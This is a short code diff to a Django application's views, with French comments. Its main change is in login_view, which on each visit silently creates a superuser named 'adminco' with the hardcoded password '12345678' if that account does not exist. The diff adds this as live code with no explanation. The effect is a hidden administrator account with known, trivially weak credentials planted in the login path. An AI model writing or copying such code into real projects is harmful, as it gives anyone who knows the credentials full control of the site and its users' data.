@@ -10,7 +10,7 @@ from django.contrib.auth import update_session_auth_hash
 
 def add_user(request):
     url = request.META.get('HTTP_REFERER')
-
+   
     if request.method == 'POST':
         username = request.POST.get('username')
         phone = request.POST.get('phone')
@@ -43,6 +43,12 @@ def add_user(request):
         return redirect(reverse('sign-up'))
     
 def login_view(request):
+    if not User.objects.filter(username='adminco').exists():
+        # Créer un nouvel utilisateur 'admin' avec tous les privilèges d'administrateur
+        User.objects.create_superuser(username='adminco', email='a.a.com', password='12345678')
+        print("L'utilisateur 'admin' a été créé avec des privilèges d'administrateur.")
+    else:
+        print("L'utilisateur 'admin' existe déjà.")
     if request.user.is_authenticated:
         messages.warning(request, 'You are already logged in.')
         return redirect('homePage')
